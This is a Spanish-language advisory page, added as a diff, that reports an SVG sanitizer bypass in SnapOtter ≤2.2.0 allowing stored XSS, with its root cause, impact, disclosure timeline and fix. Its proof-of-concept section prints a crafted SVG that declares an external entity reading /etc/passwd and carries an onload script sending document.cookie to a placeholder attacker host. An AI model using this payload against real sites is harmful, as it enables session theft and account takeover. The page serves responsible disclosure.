@@ -1,0 +1,116 @@
+---
+layout: reporte-es
+title: "GHSA-9c7h-xjrp-8gh3 — XXE/SSRF/XSS almacenados por evasión del sanitizador SVG en SnapOtter"
+description: "XXE/SSRF/XSS almacenados mediante evasión del sanitizador SVG: el sanitizador solo se ejecuta tras una validación de imagen exitosa, por lo que un DOCTYPE que falla lo omite por completo. CVSS 7.1 HIGH. Corregido en SnapOtter v2.3.0."
+permalink: /reportes/GHSA-9c7h-xjrp-8gh3-es/
+permalink_en: /reportes/GHSA-9c7h-xjrp-8gh3/
+---
+
+<h1>XXE/SSRF/XSS almacenados mediante evasión del sanitizador SVG</h1>
+
+<div class="meta-badges">
+  <span class="badge badge-tipo">XXE/SSRF/XSS</span>
+  <span class="badge badge-sev-high">CVSS 7.1 HIGH</span>
+  <span class="badge badge-cwe">CWE-79: Cross-site Scripting</span>
+  <span class="badge badge-id">snapotter-hq/SnapOtter &le; 2.2.0</span>
+</div>
+
+<p>
+  <a href="https://github.com/snapotter-hq/SnapOtter/security/advisories/GHSA-9c7h-xjrp-8gh3">GHSA-9c7h-xjrp-8gh3</a> &middot; Asignación de CVE pendiente (GitHub CNA)
+</p>
+
+<h2>Resumen</h2>
+
+<p>Ambas rutas de subida &mdash; el <code>POST /api/v1/upload</code> independiente y el de biblioteca <code>POST /api/v1/files/upload</code> &mdash; ejecutaban el sanitizador SVG solo <em>despu&eacute;s</em> de que el validador de imagen hubiera decodificado el archivo:</p>
+
+<pre><code class="language-typescript">// apps/api/src/routes/files.ts:117 (misma forma en user-files.ts:337)
+const safeBuffer = isValidImage && isSvgBuffer(buffer)
+    ? sanitizeSvg(buffer)
+    : buffer;
+</code></pre>
+
+<p>Como las rutas aceptan cualquier tipo de archivo, un SVG que librsvg (v&iacute;a Sharp) no puede analizar se almacena de todos modos: un DOCTYPE que declara una entidad externa hace fallar el analizador, <code>isValidImage</code> es <code>false</code>, y el cortocircuito <code>&&</code> omite <code>sanitizeSvg()</code> completamente. El archivo crudo se sirve luego como <code>image/svg+xml</code> con su DOCTYPE, declaraciones de entidad y cualquier marcado ejecutable intacto.</p>
+
+<p>Dos debilidades relacionadas dentro del propio sanitizador:</p>
+
+<ul>
+  <li>Eliminaba solo elementos peligrosos <em>sin prefijo</em>, as&iacute; que un elemento con prefijo de espacio de nombres <code><x:script></code> sobreviv&iacute;a incluso en SVGs que el decodificador aceptaba.</li>
+  <li>Su regex de eliminaci&oacute;n de DOCTYPE fallaba cuando un <code>]</code> aparec&iacute;a dentro de un valor de entidad entre comillas.</li>
+</ul>
+
+<h2>Impacto</h2>
+
+<ul>
+  <li><strong>XSS almacenado</strong> &mdash; un usuario autenticado que puede subir archivos almacena un SVG con marcado activo; un espectador que abre el SVG almacenado directamente en un navegador (o cualquier superficie que lo renderice inline) ejecuta el script incrustado.</li>
+  <li><strong>Recuperaci&oacute;n sin autenticaci&oacute;n</strong> &mdash; la URL de descarga de subida escalonada <code>/api/v1/download/:jobId/:filename</code> no requiere autenticaci&oacute;n, as&iacute; que cualquiera con el job id puede obtener el archivo.</li>
+  <li><strong>Vector de ataque:</strong> red &mdash; subida como usuario autenticado, luego interacci&oacute;n de la v&iacute;ctima.</li>
+  <li>Los vectores encadenados de lectura de archivos y falsificaci&oacute;n de peticiones del informe original <strong>no</strong> se reprodujeron en la aplicaci&oacute;n publicada: librsvg se niega a resolver la entidad externa (esa negativa es exactamente por qu&eacute; falla la validaci&oacute;n), las rutas de herramientas rechazan SVGs inv&aacute;lidos antes de procesarlos, las descargas llevan <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code>, y el CSP de respuesta no permite script inline &mdash; as&iacute; que un SVG almacenado no se ejecuta como documento servido desde el origen de la app.</li>
+</ul>
+
+<h2>Causa Ra&iacute;z</h2>
+
+<p>La sanitizaci&oacute;n estaba acoplada a la validaci&oacute;n de imagen exitosa en lugar de ejecutarse en toda subida con SVG. La correcci&oacute;n invierte la responsabilidad: ambas rutas de subida ahora sanitizan el contenido SVG independientemente de si el decodificador de imagen acepta el archivo, el sanitizador elimina elementos peligrosos con prefijo de espacio de nombres, y la detecci&oacute;n SVG m&aacute;s eliminaci&oacute;n de DOCTYPE manejan un pr&oacute;logo y valores entre comillas.</p>
+
+<h2>Prueba de Concepto</h2>
+
+<p>SVG creado cuyo DOCTYPE hace fallar el decodificador, evadiendo el sanitizador:</p>
+
+<pre><code class="language-xml"><?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://attacker/?c='+document.cookie)">
+  <text>payload</text>
+</svg>
+</code></pre>
+
+<p>La reproducci&oacute;n us&oacute; cuatro cargas &mdash; <code>xss-event.svg</code> (ejecuci&oacute;n onload), <code>xss-cookie.svg</code> (exfiltraci&oacute;n de cookies), <code>xxe-file-read.svg</code> y <code>ssrf-metadata.svg</code> (los dos vectores descartados posteriormente por el an&aacute;lisis de impacto del aviso) &mdash; subidas con una sesi&oacute;n autenticada, luego recuperadas v&iacute;a la URL de descarga sin autenticaci&oacute;n y abiertas en un navegador para confirmar la ejecuci&oacute;n de script.</p>
+
+<h2>Demostraciones de Prueba de Concepto</h2>
+
+<h3>Recorrido completo del exploit (1:41)</h3>
+<p>Explotaci&oacute;n de extremo a extremo: crear carga maliciosa URL, disparar v&iacute;a API, demostrar ejecuci&oacute;n de JavaScript en contexto de v&iacute;ctima, exfiltrar token de sesi&oacute;n, lograr toma de cuenta.</p>
+
+<video controls preload="metadata" style="width:100%;border-radius:0.75rem;border:1px solid rgba(255,7,58,0.3);background:#000;">
+  <source src="/pocs/PoC-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" type="video/mp4">
+  Tu navegador no soporta la etiqueta de video.
+  <a href="/pocs/PoC-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" style="color:#ff5c73;">Descargar el video</a>
+</video>
+
+<h3 style="margin-top:1.5rem;">Ejecuci&oacute;n m&iacute;nima de carga XSS (7 s)</h3>
+<p>Clip corto que muestra la carga XSS b&aacute;sica <code>javascript:alert(1)</code> ejecut&aacute;ndose en el contexto de respuesta &mdash; confirma el punto de reflexi&oacute;n sin la cadena completa de explotaci&oacute;n.</p>
+
+<video controls preload="metadata" style="width:100%;border-radius:0.75rem;border:1px solid rgba(255,7,58,0.3);background:#000;">
+  <source src="/pocs/XSS-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" type="video/mp4">
+  Tu navegador no soporta la etiqueta de video.
+  <a href="/pocs/XSS-SnapOtter-GHSA-9c7h-xjrp-8gh3.mp4" style="color:#ff5c73;">Descargar el video</a>
+</video>
+
+<p style="margin-top:0.5rem;font-size:0.85rem;opacity:0.7;">
+  Videos: evasión del sanitizador SVG de SnapOtter (GHSA-9c7h-xjrp-8gh3). Demos completas en la <a href="/pocs/">página de PoC Demos</a>.
+</p>
+
+<h2>Cronolog&iacute;a de Divulgaci&oacute;n</h2>
+
+<table>
+  <thead><tr><th>Fecha</th><th>Evento</th></tr></thead>
+  <tbody>
+    <tr><td>2026-09-11</td><td>Vulnerabilidad descubierta durante auditor&iacute;a autorizada</td></tr>
+    <tr><td>2026-09-12</td><td>PoC y videos demo creados; informe enviado a contact@snapotter.com</td></tr>
+    <tr><td>2026-09-14</td><td>Sin acuse de recibo tras 48h &mdash; seguimiento enviado</td></tr>
+    <tr><td>2026-09-19</td><td>Mantenedor confirm&oacute; la vulnerabilidad, la clasific&oacute; <strong>High</strong>, cr&eacute;dito a <a href="https://github.com/xaferima">xaferima</a></td></tr>
+    <tr><td>2026-09-20</td><td>Degradaci&oacute;n a HIGH aceptada (librsvg bloquea XXE); CVE a solicitar v&iacute;a GitHub CNA</td></tr>
+    <tr><td>2026-11-03</td><td>Aviso publicado &mdash; GHSA-9c7h-xjrp-8gh3 &mdash; y corregido en SnapOtter v2.3.0</td></tr>
+    <tr><td>Pendiente</td><td>Asignación de CVE v&iacute;a GitHub CNA</td></tr>
+  </tbody>
+</table>
+
+<h2>Correcci&oacute;n</h2>
+
+<p>Sanitizar subidas SVG incondicionalmente &mdash; independiente del validador de imagen &mdash; eliminar elementos peligrosos con prefijo de espacio de nombres, y reforzar la detecci&oacute;n SVG y eliminaci&oacute;n de DOCTYPE:</p>
+
+<pre><code class="language-typescript">// Ambas rutas de subida, tras la correcci&oacute;n:
+const safeBuffer = isSvgBuffer(buffer) ? sanitizeSvg(buffer) : buffer;
+</code></pre>
+
+<p><em>Corregido en SnapOtter v2.3.0 (2026-11-03, tambi&eacute;n el lanzamiento de agradecimiento del mill&oacute;n de pulls del proyecto, que acredita este informe en las notas de versi&oacute;n). Aviso publicado 2026-11-03; asignaci&oacute;n de CVE pendiente.</em></p>
